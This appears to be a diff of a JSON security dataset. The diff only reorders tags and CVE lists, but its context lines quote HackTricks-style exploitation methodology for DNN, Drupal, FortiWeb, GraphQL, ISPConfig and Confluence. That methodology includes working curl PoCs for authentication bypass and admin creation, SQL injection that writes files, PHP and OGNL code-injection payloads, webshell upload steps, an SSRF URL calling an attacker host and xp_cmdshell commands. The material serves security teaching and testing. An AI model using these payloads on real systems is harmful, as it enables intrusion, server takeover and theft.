(CVE-2018-15811/15812/18325/18326).  Exploitation works **without authentication** on 7.x–9.1.x and with a *verified* low-privilege account on 9.2.x+.\n\n## 2. Server-Side Request Forgery  (CVE-2025-32372)\n*Affected versions < 9.13.8  –  Patch released April 2025*\n\nA bypass of the older `DnnImageHandler` fix enables an attacker to coerce the server to issue **arbitrary GET requests** (semi-blind SSRF).  Practical impacts:\n\n* Internal port scan / metadata service discovery in cloud deployments.\n* Reach hosts otherwise firewalled from the Internet.\n\nProof-of-concept (replace `TARGET` & `ATTACKER`):\n```\nhttps://TARGET/API/RemoteContentProxy?url=http://ATTACKER:8080/poc\n```\nThe request is triggered in the background; monitor your listener for callbacks.\n\n## 3. NTLM Hash Exposure via UNC Redirect  (CVE-2025-52488)\n*Affected versions 6.0.0 – 9.x (< 10.0.1)*\n\nSpecially crafted content can make DNN attempt to fetch a resource using a **UNC path** such as `\\\\attacker\\share\\img.png`.  Windows will happily perform NTLM negotiation, leaking the server-account hashes to the attacker.  Upgrade to **10.0.1** or disable outbound SMB at the firewall.\n\n## 4. IP Filter Bypass  (CVE-2025-52487)\nIf administrators rely on *Host/IP Filters* for admin portal protection, be aware that versions prior to **10.0.1** can be bypassed by manipulating `X-Forwarded-For` in a reverse-proxy scenario.\n\n---\n\n## Via SQL console\nUnder **`Settings → SQL`** a built-in query window allows execution against the site database.  On Microsoft SQL Server you can enable **`xp_cmdshell`** and spawn commands:\n\n```sql\nEXEC sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\nGO\nxp_cmdshell 'whoami';\n```\n\n## Via ASPX webshell upload\n1. Go to **`Settings → Security → More → More Security Settings`**.\n2. Append `aspx` (or `asp`) to **Allowable File Extensions** and **Save**.\n3. Browse to **`/admin/file-management`** and upload `shell.aspx`.\n4. Trigger it at **`/Portals/0/shell.aspx`**.\n\n---\n\n## Privilege Escalation on Windows\nOnce code execution is achieved as **IIS AppPool\\<Site>**, common Windows privilege-escalation techniques apply.  If the box is vulnerable you can leverage:\n\n* **PrintSpoofer** / **SpoolFool** to abuse *SeImpersonatePrivilege*.\n* **Juicy/Sharp Potatoes** to escape *Service Accounts*.\n\n---\n\n## Hardening Recommendations (Blue Team)\n* **Upgrade** to at least **9.13.9** (fixes SSRF bypass) or preferably **10.0.1** (IP filter & NTLM issues).\n* Remove residual **`InstallWizard.aspx*`** files after installation.\n* Disable outbound SMB (ports 445/139) egress.\n* Enforce strong *Host Filters* on the edge proxy rather than within DNN.\n* Block access to `/API/RemoteContentProxy` if unused.",
@@ -16025,8 +16025,8 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "0",
    "exploit/windows/http/dnn_cookie_deserialization_rce",
+   "0",
    "dotnetnuke dnn"
   ]
  },
@@ -16238,10 +16238,10 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
+   "CVE-2024-13296",
    "CVE-2024-55638",
    "CVE-2024-55637",
-   "CVE-2024-13297",
-   "CVE-2024-13296"
+   "CVE-2024-13297"
   ],
   "privilege_escalation": [],
   "methodology": "## Drupal RCE\n{{#include ../../../banners/hacktricks-training.md}}\n\n## With PHP Filter Module\n> [!WARNING]\n> In older versions of Drupal **(before version 8)**, it was possible to log in as an admin and **enable the `PHP filter` module**, which \"Allows embedded PHP code/snippets to be evaluated.\" But from version 8 this module is not installed by default.\n\n1. Go to **/modules/php** and if a 403 error is returned then the **PHP filter plugin is installed and you can continue**\n   1. If not, go to `Modules` and check on the box of `PHP Filter` and then on `Save configuration`\n2. Then, to exploit it, click on `Add content` , then Select `Basic Page` or `Article` and write the **PHP backdoor**, then select `PHP` code in Text format and finally select `Preview`\n3. To trigger it, just access the newly created node:\n\n```bash\ncurl http://drupal.local/node/3\n```\n\n## Install PHP Filter Module\n> [!WARNING]\n> In current versions it's no longer possible to install plugins by only having access to the web after the default installation.\n\nFrom version **8 onwards, the** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **module is not installed by default**. To leverage this functionality, we would have to **install the module ourselves**.\n\n1. Download the most recent version of the module from the Drupal website.\n   1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`\n2. Once downloaded go to **`Administration`** > **`Reports`** > **`Available updates`**.\n3. Click on **`Browse`**, select the file from the directory we downloaded it to, and then click **`Install`**.\n4. Once the module is installed, we can click on **`Content`** and **create a new basic page**, similar to how we did in the Drupal 7 example. Again, be sure to **select `PHP code` from the `Text format` dropdown**.\n\n## Backdoored Module\n> [!WARNING]\n> In current versions it's no longer possible to install plugins by only having access to the web after the default installation.\n\nIt was possible to **download** a **module**, add a **backdoor** to it and **install** it. For example, downloading [**Trurnstile**](https://www.drupal.org/project/turnstile) module in compressed format, creating a new PHP backdoor file inside of it, allowing the accessing of the PHP file with a `.htaccess` file:\n\n```html\n<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>\n```\n\nAnd then going to **`http://drupal.local/admin/modules/install`** to install the backdoored module and access **`/modules/turnstile/back.php`** to execute it.\n\n## Backdooring Drupal with Configuration synchronization <a href=\"#backdooring-drupal\" id=\"backdooring-drupal\"></a>\n**Post shared by** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)\n\n## Part 1 (activation of _Media_ and _Media Library_)\nIn the _Extend_ menu (/admin/modules), you can activate what appear to be plugins already installed. By default, plugins _Media_ and _Media Library_ don’t appear to be activated, so let’s activate them.\n\nBefore activation:\n\n<figure><img src=\"../../../images/image (4) (1) (1) (1) (1).png\" alt=\"\"><figcaption></figcaption></figure>\n\nAfter activation:\n\n<figure><img src=\"../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png\" alt=\"\"><figcaption></figcaption></figure>\n\n<figure><img src=\"../../../images/image (2) (1) (1) (1) (1) (1) (1).png\" alt=\"\"><figcaption></figcaption></figure>\n\n## Part 2 (leveraging feature _Configuration synchronization_) <a href=\"#part-2-leveraging-feature-configuration-synchronization\" id=\"part-2-leveraging-feature-configuration-synchronization\"></a>\nWe’ll leverage the _Configuration synchronization_ feature to dump (export) and upload (import) Drupal configuration entries:\n\n- /admin/config/development/configuration/single/export\n- /admin/config/development/configuration/single/import\n\n**Patch system.file.yml**\n\nLet’s start by patching the first entry `allow_insecure_uploads` from:\n\nFile: system.file.yml\n\n```\n\n...\n\nallow_insecure_uploads: false\n\n...\n\n```\n\n<figure><img src=\"../../../images/image (3) (1) (1) (1) (1) (1) (1).png\" alt=\"\"><figcaption></figcaption></figure>\n\nTo:\n\nFile: system.file.yml\n\n```\n\n...\n\nallow_insecure_uploads: true\n\n...\n\n```\n\n<figure><img src=\"../../../images/image (4) (1) (1) (1) (1) (1).png\" alt=\"\"><figcaption></figcaption></figure>\n\n**Patch field.field.media.document.field_media_document.yml**\n\nThen, patch the second entry `file_extensions` from:\n\nFile: field.field.media.document.field_media_document.yml\n\n```\n\n...\n\n  file_directory: '[date:custom:Y]-[date:custom:m]'\n  file_extensions: 'txt rtf doc docx ppt pp\n\n## Part 3 (leveraging feature _Add Document_) <a href=\"#part-3-leveraging-feature-add-document\" id=\"part-3-leveraging-feature-add-document\"></a>\nThe last step is the simplest, and is broken down into two sub-steps. The first is to upload a file in .htaccess format to leverage the Apache directives and allow .txt files to be interpreted by the PHP engine. The second is to upload a .txt file containing our p",
@@ -16249,8 +16249,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "drupal rce",
-   "0"
+   "0",
+   "drupal rce"
   ]
  },
  {
@@ -16677,8 +16677,8 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "electron contextisolation rce via electron internal code",
-   "0"
+   "0",
+   "electron contextisolation rce via electron internal code"
   ]
  },
  {
@@ -16814,8 +16814,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "flask",
-   "0"
+   "0",
+   "flask"
   ]
  },
  {
@@ -16859,9 +16859,9 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2025-58034",
    "CVE-2025-25257",
-   "CVE-2025-59719"
+   "CVE-2025-59719",
+   "CVE-2025-58034"
   ],
   "privilege_escalation": [],
   "methodology": "## Overview\nFortinet FortiWeb exposes a centralized CGI dispatcher at `/cgi-bin/fwbcgi`. A two-bug chain allows an unauthenticated remote attacker to:\n- Reach `fwbcgi` by starting the URL with a valid API prefix and traversing directories.\n- Impersonate any user (including the built-in `admin`) by supplying a special HTTP header that the CGI trusts as identity.\n\nVendor advisory: FG‑IR‑25‑910 (CVE‑2025‑64446). Exploitation has been observed in the wild to create persistent admin users.\n\nImpacted versions (as publicly documented):\n- 8.0 < 8.0.2\n- 7.6 < 7.6.5\n- 7.4 < 7.4.10\n- 7.2 < 7.2.12\n- 7.0 < 7.0.12\n- 6.4 ≤ 6.4.3\n- 6.3 ≤ 6.3.23\n\nFortiWeb 8.0.2 returns HTTP 403 for the traversal probe below.\n\n## Quick vulnerability probe\n- Path traversal from API prefix to `fwbcgi`:\n\n```http\nGET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1\nHost: <target>\n```\n\n- Interpretation: HTTP 200 → likely vulnerable; HTTP 403 → patched.\n\n## Root cause chain\n1) API-prefix path traversal to internal CGI\n- Any request path that begins with a valid FortiWeb API prefix (e.g., `/api/v2.0/cmdb/` or `/api/v2.0/cmd/`) can traverse with `../` to `/cgi-bin/fwbcgi`.\n\n2) Minimal-body validation bypass\n- Once `fwbcgi` is reached, a first gate performs a permissive JSON check keyed by a per-path file under `/var/log/inputcheck/`. If the file is absent, the check passes immediately. If present, the body only needs to be valid JSON. Use `{}` as a minimal compliant body.\n\n3) Header-driven user impersonation\n- The program reads the CGI environment variable `HTTP_CGIINFO` (derived from the HTTP header `CGIINFO`), Base64-decodes it, parses JSON, and copies attributes directly into the login context, setting the domain/VDOM. Keys of interest:\n  - `username`, `loginname`, `vdom`, `profname`\n- Example JSON to impersonate the built-in admin:\n\n```json\n{\n  \"username\": \"admin\",\n  \"profname\": \"prof_admin\",\n  \"vdom\": \"root\",\n  \"loginname\": \"admin\"\n}\n```\n\nBase64 of the\n\n## End-to-end abuse pattern (unauthenticated → admin)\n1) Reach `/cgi-bin/fwbcgi` via an API-prefix traversal.\n2) Provide any valid JSON body (e.g., `{}`) to satisfy the input check.\n3) Send header `CGIINFO: <base64(json)>` where the JSON defines the target identity.\n4) POST the backend JSON expected by `fwbcgi` to perform privileged actions (e.g., create an admin user for persistence).\n\n## Minimal cURL PoC\n- Probe traversal exposure:\n\n```bash\ncurl -ik 'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'\n```\n\n- Impersonate admin and create a new local admin user:\n\n```bash\n\n## Base64(JSON) for admin impersonation\nB64='eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ=='\n\ncurl -ik \\\n  -H \"CGIINFO: $B64\" \\\n  -H 'Content-Type: application/json' \\\n  -X POST \\\n  --data '{\"data\":{\"name\":\"watchTowr\",\"access-profile\":\"prof_admin\",\"access-profile_val\":\"0\",\"trusthostv4\":\"0.0.0.0/0\",\"trusthostv6\":\"::/0\",\"type\":\"local-user\",\"type_val\":\"0\",\"password\":\"P@ssw0rd!\"}}' \\\n  'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'\n```\n\nNotes:\n- Any valid JSON body suffices (e.g., `{}`) if `/var/log/inputcheck/<path>.json` does not exist.\n- The action schema is FortiWeb-internal; the example above adds a local admin with full privileges.\n\n## Pre-auth Fabric Connector SQLi → RCE (CVE-2025-25257)\n- Affects 7.6.0–7.6.3, 7.4.0–7.4.7, 7.2.0–7.2.10, 7.0.0–7.0.10. Fixed in 7.6.4 / 7.4.8 / 7.2.11 / 7.0.11.\n- Bug: `get_fabric_user_by_token()` uses the `Authorization: Bearer <token>` value directly in a SQL query. Attacker supplies SQL that runs as MySQL user and can drop files via `SELECT ... INTO OUTFILE`, yielding code exec (webshell/`.pth` loader).\n- Typical attack surface: `/api/fabric/device/status` (and other Fabric Connector endpoints) over HTTP/HTTPS on the management plane.\n- Rapid test for SQLi:\n\n```bash\ncurl -sk -X POST \\\n  -H \"Authorization: Bearer ' UNION SELECT NULL,NULL,NULL,NULL INTO OUTFILE '/data/var/tmp/pwn.txt' -- -\" \\\n  https://<host>/api/fabric/device/status\n```\n\n- Weaponization: write a `.pth` into FortiWeb's Python site-packages that imports `os;os.system(...)` on interpreter start, or drop a CGI under the webroot. Reloading services will execute the payload.\n- Hunting clues: Authorization headers containing quotes/UNION/SELECT; unexpected files under `/data/li\n\n## FortiCloud SSO signature bypass (CVE-2025-59719)\n- Improper SAML signature verification lets an attacker forge FortiCloud SSO responses and log in as admin with no credentials.\n- Only exploitable when **FortiCloud SSO login** is enabled (it turns on automatically if the appliance was registered via GUI unless the checkbox was unticked).\n- Affected (per PSIRT): 8.0.0, 7.6.0–7.6.4, 7.4.0–7.4.9. Patched in 8.0.1 / 7.6.5 / 7.4.10.\n\n## OS command injection in management plane (CVE-2025-58034)\n- Affected: 7.0.0–7.0.11, 7.2.0–7.2.11, 7.4.0–7.4.10, 7.6.0–7.6.5, 8.0.0–8.0.1. Fixed in 7.0.12 / 7.2.12 / 7.4.11 / 7.6.6 / 8.0.2.\n- Prac",
@@ -16889,8 +16889,8 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "git",
-   "0"
+   "0",
+   "git"
   ]
  },
  {
@@ -16915,8 +16915,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "golang",
-   "0"
+   "0",
+   "golang"
   ]
  },
  {
@@ -17251,9 +17251,9 @@
    }
   ],
   "common_vulnerabilities": [
-   "CVE-2023-23684",
    "CVE-2024-40094",
-   "CVE-2024-47614"
+   "CVE-2024-47614",
+   "CVE-2023-23684"
   ],
   "privilege_escalation": [],
   "methodology": "## Introduction\nGraphQL is **highlighted** as an **efficient alternative** to REST API, offering a simplified approach for querying data from the backend. In contrast to REST, which often necessitates numerous requests across varied endpoints to gather data, GraphQL enables the fetching of all required information through a **single request**. This streamlining significantly **benefits developers** by diminishing the intricacy of their data fetching processes.\n\n## GraphQL and Security\nWith the advent of new technologies, including GraphQL, new security vulnerabilities also emerge. A key point to note is that **GraphQL does not include authentication mechanisms by default**. It's the responsibility of developers to implement such security measures. Without proper authentication, GraphQL endpoints may expose sensitive information to unauthenticated users, posing a significant security risk.\n\n## Directory Brute Force Attacks and GraphQL\nTo identify exposed GraphQL instances, the inclusion of specific paths in directory brute force attacks is recommended. These paths are:\n\n- `/graphql`\n- `/graphiql`\n- `/graphql.php`\n- `/graphql/console`\n- `/api`\n- `/api/graphql`\n- `/graphql/api`\n- `/graphql/graphql`\n\nIdentifying open GraphQL instances allows for the examination of supported queries. This is crucial for understanding the data accessible through the endpoint. GraphQL's introspection system facilitates this by detailing the queries a schema supports. For more information on this, refer to the GraphQL documentation on introspection: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)\n\n## Fingerprint\nThe tool [**graphw00f**](https://github.com/dolevf/graphw00f) is capable to detect which GraphQL engine is used in a server and then prints some helpful information for the security auditor.\n\n## Universal queries <a href=\"#universal-queries\" id=\"universal-queries\"></a>\nTo check if a URL is a GraphQL service, a **universal query**, `query{__typename}`, can be sent. If the response includes `{\"data\": {\"__typename\": \"Query\"}}`, it confirms the URL hosts a GraphQL endpoint. This method relies on GraphQL's `__typename` field, which reveals the type of the queried object.\n\n```javascript\nquery{__typename}\n```\n\n## Basic Enumeration\nGraphql usually supports **GET**, **POST** (x-www-form-urlencoded) and **POST**(json). Although for security it's recommended to only allow json to prevent CSRF attacks.\n\n## Introspection\nTo use introspection to discover schema information, query the `__schema` field. This field is available on the root type of all queries.\n\n```bash\nquery={__schema{types{name,fields{name}}}}\n```\n\nWith this query you will find the name of all the types being used:\n\n![](<../../images/image (1036).png>)\n\n```bash\nquery={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}\n```\n\nWith this query you can extract all the types, it's fields, and it's arguments (and the type of the args). This will be very useful to know how to query the database.\n\n![](<../../images/image (950).png>)\n\n**Errors**\n\nIt's interesting to know if the **errors** are going to be **shown** as they will contribute with useful **information.**\n\n```\n?query={__schema}\n?query={}\n?query={thisdefinitelydoesnotexist}\n```\n\n![](<../../images/image (416).png>)\n\n**Enumerate Database Schema via Introspection**\n\n> [!TIP]\n> If introspection is enabled but the above query doesn't run, try removing \n\n## Querying\nNow that we know which kind of information is saved inside the database, let's try to **extract some values**.\n\nIn the introspection you can find **which object you can directly query for** (because you cannot query an object just because it exists). In the following image you can see that the \"_queryType_\" is called \"_Query_\" and that one of the fields of the \"_Query_\" object is \"_flags_\", which is also a type of object. Therefore you can query the flag object.\n\n![](<../../images/Screenshot from 2021-03-13 18-17-48.png>)\n\nNote that the type of the query \"_flags_\" is \"_Flags_\", and this object is defined as below:\n\n![](<../../images/Screenshot from 2021-03-13 18-22-57 (1).png>)\n\nYou can see that the \"_Flags_\" objects are composed by **name** and .**value** Then you can get all the names and values of the flags with the query:\n\n```javascript\nquery={flags{name, value}}\n```\n\nNote that in case the **object to query** is a **primitive** **type** like **string** like in the following example\n\n## Searching\nIn this setup, a **database** contains **persons** and **movies**. **Persons** are identified by their **email** and **name**; **movies** by their **name** and **rating**. **Persons** can be friends with each other and also have movies, indicating relationships within the database.\n\nYou can **search** persons **by** the **name** and get their emails:\n\n```javascript\n{\n  searchPerson(name: \"John Doe\") {\n    email\n  }\n}\n```\n\nYou can **search** persons **by** the **name** and get their **subscribed*",
@@ -17562,8 +17562,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "iis internet information services",
-   "0"
+   "0",
+   "iis internet information services"
   ]
  },
  {
@@ -17649,8 +17649,8 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2023-46818",
-   "cve-2023-46818"
+   "cve-2023-46818",
+   "CVE-2023-46818"
   ],
   "privilege_escalation": [],
   "methodology": "## Overview\nISPConfig is an open-source hosting control panel. Older 3.2.x builds shipped a language file editor feature that, when enabled for the super administrator, allowed arbitrary PHP code injection via a malformed translation record. This can yield RCE in the web server context and, depending on how PHP is executed, privilege escalation.\n\nKey default paths:\n- Web root often at `/var/www/ispconfig` when served with `php -S` or via Apache/nginx.\n- Admin UI reachable on the HTTP(S) vhost (sometimes bound to localhost only; use SSH port-forward if needed).\n\nTip: If the panel is bound locally (e.g. `127.0.0.1:8080`), forward it:\n\n```bash\nssh -L 9001:127.0.0.1:8080 user@target\n\n## Language editor PHP code injection (CVE-2023-46818)\n- Affected: ISPConfig up to 3.2.11 (fixed in 3.2.11p1)\n- Preconditions:\n  - Login as the built-in superadmin account `admin` (other roles are not affected according to the vendor)\n  - Language editor must be enabled: `admin_allow_langedit=yes` in `/usr/local/ispconfig/security/security_settings.ini`\n- Impact: Authenticated admin can inject arbitrary PHP that is written into a language file and executed by the application, achieving RCE in the web context\n\nReferences: NVD entry CVE-2023-46818 and vendor advisory link in the References section below.\n\n## Manual exploitation flow\n1) Open/create a language file to obtain CSRF tokens\n\nSend a first POST to initialize the form and parse the CSRF fields from the HTML response (`csrf_id`, `csrf_key`). Example request path: `/admin/language_edit.php`.\n\n2) Inject PHP via records[] and save\n\nSubmit a second POST including the CSRF fields and a malicious translation record. Minimal command-execution probes:\n\n```http\nPOST /admin/language_edit.php HTTP/1.1\nHost: 127.0.0.1:9001\nContent-Type: application/x-www-form-urlencoded\nCookie: ispconfig_auth=...\n\nlang=en&module=admin&file=messages&csrf_id=<id>&csrf_key=<key>&records[]=<?php echo shell_exec('id'); ?>\n```\n\nOut-of-band test (observe ICMP):\n\n```http\nrecords[]=<?php echo shell_exec('ping -c 1 10.10.14.6'); ?>\n```\n\n3) Write files and drop a webshell\n\nUse `file_put_contents` to create a file under a web-reachable path (e.g., `admin/`):\n\n```http\nrecords[]=<?php file_put_contents('admin/pwn.txt','owned'); ?>\n```\n\nThen write a simple webshell using base64 to avoid bad character\n\n## 2025 regression (ISPConfig 3.3.0 / 3.3.0p1)\nThe language editor bug resurfaced in 3.3.0/3.3.0p1 and was fixed in **3.3.0p2**. Preconditions are unchanged (`admin_allow_langedit` and admin login). The same patch also addressed a monitor XSS and world-readable rotated logs.\n\n**Notes:**\n- On 3.3.0/3.3.0p1, world-readable rotated logs under `/usr/local/ispconfig/interface/log/` may leak credentials if debug logging was enabled:\n\n```bash\nfind /usr/local/ispconfig/interface/log -type f -perm -004 -name '*.gz' -exec zcat {} + | head\n```\n- Exploit steps match CVE-2023-46818; 3.3.0p2 adds extra checks before language editing.\n\n## Python PoC\nA ready-to-use exploit automates token handling and payload delivery:\n- [https://github.com/bipbopbup/CVE-2023-46818-python-exploit](https://github.com/bipbopbup/CVE-2023-46818-python-exploit)\n\nExample run:\n\n```bash\npython3 cve-2023-46818.py http://127.0.0.1:9001 admin <password>\n```\n\n## Metasploit module (released July 2025)\nRapid7 added `exploit/linux/http/ispconfig_lang_edit_php_code_injection`, which can auto-enable `admin_allow_langedit` if the supplied admin account has system-config rights.\n\n```text\nuse exploit/linux/http/ispconfig_lang_edit_php_code_injection\nset RHOSTS 10.10.10.50\nset RPORT 8080\nset USERNAME admin\nset PASSWORD <admin_pass>\nset TARGETURI /\nrun\n```\n\nThe module writes a base64-encoded payload through `records[]` and executes it, giving a PHP Meterpreter or custom payload.\n\n## Hardening\n- Upgrade to **3.2.11p1** or later for the original issue, and to **3.3.0p2** or later for the 2025 regression.\n- Disable the language editor unless strictly needed:\n\n```\nadmin_allow_langedit=no\n```\n\n- Avoid running the panel as root; configure PHP-FPM or the web server to drop privileges\n- Enforce strong authentication for the built-in `admin` account\n\n## References\n- [ISPConfig 3.2.11p1 Released (fixes language editor code injection)](https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released/)\n- [CVE-2023-46818 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-46818)\n- [bipbopbup/CVE-2023-46818-python-exploit](https://github.com/bipbopbup/CVE-2023-46818-python-exploit)\n- [HTB Nocturnal: Root via ISPConfig language editor RCE](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)\n- [ISPConfig 3.3.0p2 Released – Security Update](https://www.ispconfig.org/blog/ispconfig-3-3-0p2-released-security-update/)\n- [CXSecurity WLB-2025070017 – Metasploit module for ISPConfig language_edit.php](https://cxsecurity.com/issue/WLB-2025070017)\n\n{{#include ../../banners/hacktricks-training.md}}",
@@ -17658,8 +17658,8 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "ispconfig",
    "exploit/linux/http/ispconfig_lang_edit_php_code_injection",
+   "ispconfig",
    "exploit/linux/http/ispconfig_lang_edit_php_code_injection`,",
    "0"
   ]
@@ -17680,9 +17680,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/scanner/http/jboss_vulnscan`",
+   "0",
    "jboss",
-   "0"
+   "auxiliary/scanner/http/jboss_vulnscan`"
   ]
  },
  {
@@ -17720,10 +17720,10 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2024-21683",
+   "CVE-2023-22527",
    "cve-2023-22527",
    "CVE-2023-22515",
-   "CVE-2023-22527"
+   "CVE-2024-21683"
   ],
   "privilege_escalation": [],
   "methodology": "## Check Privileges\nIn Jira, **privileges can be checked** by any user, authenticated or not, through the endpoints `/rest/api/2/mypermissions` or `/rest/api/3/mypermissions`. These endpoints reveal the user's current privileges. A notable concern arises when **non-authenticated users hold privileges**, indicating a **security vulnerability** that could potentially be eligible for a **bounty**. Similarly, **unexpected privileges for authenticated users** also highlight a **vulnerability**.\n\nAn important **update** was made on **1st February 2019**, requiring the 'mypermissions' endpoint to include a **'permission' parameter**. This requirement aims to **enhance security** by specifying the privileges being queried: [check it here](https://developer.atlassian.com/cloud/jira/platform/change-notice-get-my-permissions-requires-permissions-query-parameter/#change-notice---get-my-permissions-resource-will-require-a-permissions-query-parameter)\n\n- ADD_COMMENTS\n- ADMINISTER\n- ADMINISTER_PROJECTS\n- ASSIGNABLE_USER\n\n## Automated enumeration\n- [https://github.com/0x48piraj/Jiraffe](https://github.com/0x48piraj/Jiraffe)\n- [https://github.com/bcoles/jira_scan](https://github.com/bcoles/jira_scan)\n\n## CVE-2023-22527 – unauthenticated template/OGNL injection (10.0)\n* Affects Confluence Data Center/Server 8.0.x–8.5.3 & 8.4.5. Vulnerable Velocity template `text-inline.vm` allows OGNL evaluation without authentication.\n* Quick PoC (command runs as confluence user):\n\n```bash\ncurl -k -X POST \"https://confluence.target.com/template/aui/text-inline.vm\" \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'label=aaa%27%2b#request.get(\"KEY_velocity.struts2.context\").internalGet(\"ognl\").findValue(#parameters.poc[0],{})%2b%27&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader(\"x-cmd\",(new+freemarker.template.utility.Execute()).exec({\"id\"}))'\n```\n\n* Response header `x-cmd` will contain the command output. Swap `id` for a reverse shell payload.\n* Scanner: nuclei template `http/cves/2023/CVE-2023-22527.yaml` (ships in nuclei-templates ≥9.7.5).\n\n## CVE-2023-22515 – setup reactivation admin creation (auth bypass)\n* Publicly reachable Confluence Data Center/Server 8.0.0–8.5.1 allows flipping `setupComplete` and re‑running `/setup/setupadministrator.action` to create a new admin account.\n* Minimal exploit flow:\n  1. `GET /server-info.action` (unauthenticated) to ensure reachability.\n  2. `POST /server-info.action` with `buildNumber` parameters to toggle setup flag.\n  3. `POST /setup/setupadministrator.action` with `fullName`, `email`, `username`, `password`, `confirm` to spawn an admin.\n\n## CVE-2024-21683 – authenticated RCE via Code Macro upload\n* Confluence Admin can upload crafted language definition in **Configure Code Macro**; Rhino engine executes embedded Java, leading to RCE.\n* For a shell, upload a `.lang` file containing payload like:\n\n```xml\n<?xml version=\"1.0\"?>\n<languages>\n  <language key=\"pwn\" name=\"pwn\" namespace=\"java.lang\">\n    <tokens>\n      <token scope=\"normal\">${\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}</token>\n    </tokens>\n  </language>\n</languages>\n```\n\n* Trigger by selecting the malicious language in any Code Macro body. Metasploit module `exploit/multi/http/atlassian_confluence_rce_cve_2024_21683` automates auth + upload + exec.\n\n## Atlasian Plugins\nAs indicated in this [**blog**](https://cyllective.com/blog/posts/atlassian-audit-plugins), in the documentation about [Plugin modules ↗](https://developer.atlassian.com/server/framework/atlassian-sdk/plugin-modules/) it's possible to check the different types of plugins, like:\n\n- [REST Plugin Module ↗](https://developer.atlassian.com/server/framework/atlassian-sdk/rest-plugin-module): Expose RESTful API endpoints\n- [Servlet Plugin Module ↗](https://developer.atlassian.com/server/framework/atlassian-sdk/servlet-plugin-module/): Deploy Java servlets as part of a plugin\n- [Macro Plugin Module ↗](https://developer.atlassian.com/server/confluence/macro-module/): Implement Confluence Macros, i.e. parameterised HTML templates\n\nThis is an example of the macro plugin type:\n\n<details>\n<summary>Macro plugin example</summary>\n\n```java\npackage com.atlassian.tutorial.macro;\n\nimport com.atlassian.confluence.content.render.xhtml.ConversionContext;\nimport com.atlassian.confluence.macro.Macro;\nimport c\n\n## Backdoor Plugin\n[**This post**](https://cyllective.com/blog/posts/atlassian-malicious-plugin) describes different (malicious) actions that could perform a malicious Jira plugin. You can find [**code example in this repo**](https://github.com/cyllective/malfluence).\n\nThese are some of the actions a malicious plugin could perform:\n\n- **Hiding Plugins from Admins**: It's possible to hide the malicious plugin injecting some front-end javascript\n- **Exfiltrating Attachments and Pages**: Allow to access and exfiltrate all the data.\n- **Stealing Session Tokens**: Add an endpoint that will echo the headers in the response (with the c",
@@ -17731,9 +17731,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
+   "0",
    "jira",
-   "exploit/multi/http/atlassian_confluence_rce_cve_2024_21683`",
-   "0"
+   "exploit/multi/http/atlassian_confluence_rce_cve_2024_21683`"
   ]
  },
  {
@@ -18208,18 +18208,18 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
+   "CVE-2024-55556",
    "CVE-2024-55555",
-   "CVE-2025-48490",
-   "CVE-2021-3129",
-   "CVE-2024-48987",
-   "CVE-2024-13919",
-   "CVE-2024-13918",
-   "CVE-2025-27515",
    "CVE-2018-15133",
-   "CVE-2024-52301",
-   "cve-2025-47275",
    "CVE-2025-47275",
-   "CVE-2024-55556"
+   "cve-2025-47275",
+   "CVE-2025-48490",
+   "CVE-2024-52301",
+   "CVE-2025-27515",
+   "CVE-2021-3129",
+   "CVE-2024-13918",
+   "CVE-2024-13919",
+   "CVE-2024-48987"
   ],
   "privilege_escalation": [],
